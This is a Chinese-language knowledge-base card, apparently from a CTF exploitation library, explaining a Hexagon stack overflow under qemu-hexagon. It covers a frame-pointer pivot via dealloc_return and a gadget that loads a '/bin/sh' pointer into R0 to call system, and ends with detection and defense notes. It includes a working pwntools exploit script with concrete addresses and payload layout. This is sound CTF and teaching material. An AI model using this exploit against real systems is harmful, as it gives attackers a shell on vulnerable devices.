---
id: binary-pwn-stack-hexagon-qemu-fp-pivot-dealloc-return
title: Hexagon 架构栈溢出（qemu-hexagon 无 ASLR）：改写 FP 触发 dealloc_return 栈迁移，用 r0=memw(fp-8) gadget 给 system 传参
type: scenario
domain: binary
path: binary/pwn/stack
technique: hexagon-frame-pointer-pivot-dealloc-return
aliases:
- hexagon pwn
- qemu-hexagon 栈溢出
- dealloc_return 栈迁移
- Hexagon 帧指针劫持
- 无 pop 架构寄存器传参
tags:
- pwn
- hexagon
- qemu
- stack-overflow
- stack-pivot
- ret2libc
- no-aslr
- gadget
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:27:33+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文。原文：qemu-hexagon（无 ASLR、chall 未开 PIE）下 -strace 得 read(0,0x4080ebe0,272) 泄露栈地址、PLT 的 {r28=memw(r14)}{jumpr r28} 残留 puts 地址（r28=0x3ffa7c40，puts 偏移 0xD7C40）算出 libc 基址 0x3FED0000，再用 0x204b4 的 {r0=memw(fp+#var_8)}{dealloc_return} 取参 gadget 与 0x2041c 的 {dealloc_return} 做两次返回完成栈迁移并调 system；卡片 EXP 与原文逐字段一致（含 payload.ljust(0x100) 后覆盖 saved FP/LR）。原文自述地址随环境变化、未本地复现，卡片 confidence medium 与「地址按样本填写」提示恰当。未执行任何 PoC。
---

## 一句话结论

Hexagon 架构没有 x86 那样随手可用的 `pop rdi; ret`，栈溢出后无法直接给 `system` 传参；但只要泄露栈地址与 libc 基址，就可以把溢出数据末尾的「保存的 FP」改成指向自己可控缓冲区、把「保存的 LR」改成 `dealloc_return` 指令地址，让 `dealloc_return` 先把新 FP 弹回、再从新 LR 返回，从而把执行流与栈同时迁到可控区；再用一条 `r0 = memw(fp + #var_8)` 紧接 `dealloc_return` 的 gadget，把 FP-8 处写入的 `/bin/sh` 指针取到 R0，随后返回 `system` 即可 getshell。

## 原理

- **Hexagon 栈帧与返回机制**：`allocframe` 在进入函数时把 LR（R31）、FP（R30）压栈并把 FP 指向旧 FP、SP 下移；`dealloc_return` 从栈底恢复 FP 与 LR 后跳回 LR。函数返回完全依赖栈上这对 (FP, LR)，因此溢出写穿局部缓冲区后可以直接覆盖保存的 FP/LR——这一点与 ARM 的 `pop {fp,pc}` 同理，只是指令名不同。
- **为什么没有 pop 传参**：Hexagon 的通用寄存器 R0-R31 用 `{ rN = ... }` 形式的指令赋值，不存在 `pop`，溢出数据只能落到内存而不能直接落到参数寄存器。想调 `system("/bin/sh")` 就必须先让某个寄存器（这里是 R0）从可控内存取值。
- **栈迁移是唯一出路**：把保存的 LR 设为 `dealloc_return` 指令地址、保存的 FP 设为可控缓冲区地址 B，程序返回一次后 FP 变成 B 处写入的值、并从 B+4 处继续执行；第二次 `dealloc_return` 再弹一次，就能把控制流引到 B 中偏移处，B 的内容完全由攻击者写。
- **取参 gadget**：`{ r0 = memw(fp + #var_8) } { dealloc_return }`（本卡样本在 0x204b4）会先用当前 FP 读到 R0、紧接着返回；把 FP 设成 B+0x10，则在 `B+0x8` 写 `/bin/sh` 地址即被读进 R0，返回地址（B+0x14）再指向 libc 的 `system`，形成一次「先填参、再调用」的两段返回。
- **为什么能拿到固定地址**：qemu-user 模拟执行一般不开 ASLR，被测程序也没有 PIE，栈地址与 libc 基址在一次运行内是固定值，可从 `-strace` 记录的系统调用参数（`read(0,0x4080ebe0,272)` 这类）里直接读出输入缓冲区地址，反复使用。
- **libc 基址的旁路泄露**：PLT 跳板 `{ r28 = memw(r14) } { jumpr r28 }` 会把解析后的函数地址留在 R28，用 `-d cpu` 记录寄存器快照即可在调用 `puts` 后读到 R28=libc 内 `puts` 地址，减去符号偏移得到基址，不需额外泄露接口。

## 触发条件

- 目标为 Hexagon 架构 ELF（常见于高通 DSP/SDK 相关 CTF 题与固件），存在可覆盖保存 FP/LR 的栈缓冲区溢出。
- 运行环境为 qemu-hexagon（qemu-user）等无 ASLR 的模拟器，或二进制未开 PIE，栈/libc 地址可预测或可泄露。
- 存在「从 FP 相对偏移取数写入参数寄存器 + 返回」的 gadget；样本中该 gadget 恰好是函数把 FP-8 当返回值装载的常见收尾序列。
- 缓冲区内容在返回前不会被 canary/返回地址加密校验拦下（Hexagon 有栈 canary 与密钥寄存器保护的返回地址，本题未启用）。

## 利用步骤

1. 用 `qemu-hexagon -d in_asm,exec,cpu,nochain -singlestep -dfilter <函数范围>` 单步记录寄存器上下文，`-strace` 记录系统调用参数；qemu 默认以 TB 为单位执行，不加 `-singlestep` 看不到逐指令寄存器。
2. 从 `read(0, <栈地址>, n)` 的 strace 行取输入缓冲区地址作为迁移目标 B；从调用 `puts` 后的 R28 减去 libc 符号偏移得到 libc 基址。
3. 计算三个 gadget 地址：`ret = dealloc_return`、`gadget1 = {r0 = memw(fp-8)} {dealloc_return}`、`system` 与 `/bin/sh` 的字面量地址。
4. 构造 payload：开头放迁移后的 FP（B+0x10）与 gadget1 地址，接着放 `/bin/sh` 字符串地址（落在 B+0x8）与填充，再放 `system`（落在 B+0x14）；尾部填充到偏移处，写 `[B, ret]` 覆盖保存的 FP/LR。
5. 发送后程序连续两次 `dealloc_return`：第一次进入 B 并把 FP 设为 B+0x10；第二次经 gadget1 把 B+0x8 的 `/bin/sh` 装入 R0 后跳到 `system`。

## PoC

原文 EXP 的核心结构（地址按样本填写，实际偏移需自行确认）：

```python
stack = 0x4080ebe0        # -strace 泄露的输入缓冲区地址
libc_base = 0x3FED0000    # R28(puts) - libc.symbols['puts']
gadget1 = 0x204b4         # { r0 = memw(fp + #var_8) } { dealloc_return }
ret = 0x2041c             # { dealloc_return }

payload  = p32(stack + 0x10)                       # 迁移后的新 FP
payload += p32(gadget1)                            # 迁移后的第一跳
payload += p32(libc_base + next(libc.search(b'/bin/sh\x00')))  # 落在 FP-8，被装入 r0
payload += p32(0) + p32(0)
payload += p32(libc_base + libc.symbols['system'])  # 落在 FP+4，gadget 返回目标
payload  = payload.ljust(0x100, b'\x90')
payload += p32(stack) + p32(ret)                   # 覆盖保存的 FP / LR

r.recv(); r.send(payload); r.interactive()
```

调试入口与上文一致，用 `process(['qemu-hexagon','-L','libc','-d','in_asm,exec,cpu,nochain','-singlestep','-dfilter','0x20400+0xc0','-strace','-D','./log','./chall'])` 收集同一份 log。

## 变体与关联

- **同思路的其他非 x86 架构**：MIPS 用 `lw $ra`/`move $t9` 与栈迁移（见 [[binary-pwn-rop-mips-pivot-got-libpivot-ret2win]]、[[binary-pwn-stack-mips-srop-sigreturn-bss-execve]]）；x86 侧对应 `leave; ret` 迁移（见 [[binary-pwn-stack-pivot-leave-ret-bss]]）。共同点是「溢出只能落内存，必须靠一次返回把 SP/FP 换成可控地址再继续取参」。
- **若开启返回地址加密/栈 canary**：Hexagon 的密钥在专用控制寄存器里，纯栈溢出失效；需先泄露 key 或改用其它写原语。
- **若模拟器带 ASLR**：本链失效，需要先找任意读/泄漏把栈与 libc 基址打出来（如 PLT 未解析时的 GOT 读）。

## 检测与防御

- **检测**：qemu 类模拟环境的日志中出现「栈地址与 libc 基址在不同运行间不变」本身即为风险信号；真实设备上应关注异常 `dealloc_return` 目标不落在合法函数边界、FP 指向栈外缓冲区、以及紧邻返回前的 `memw(fp-8)` 非典型帧访问。
- **防御**：编译开启 PIE 与栈保护；Hexagon 场景启用返回地址加密与 canary；测试/题目环境不要以关闭 ASLR 的方式发布；对 DSP 侧进程做栈可执行性与异常返回目标校验。
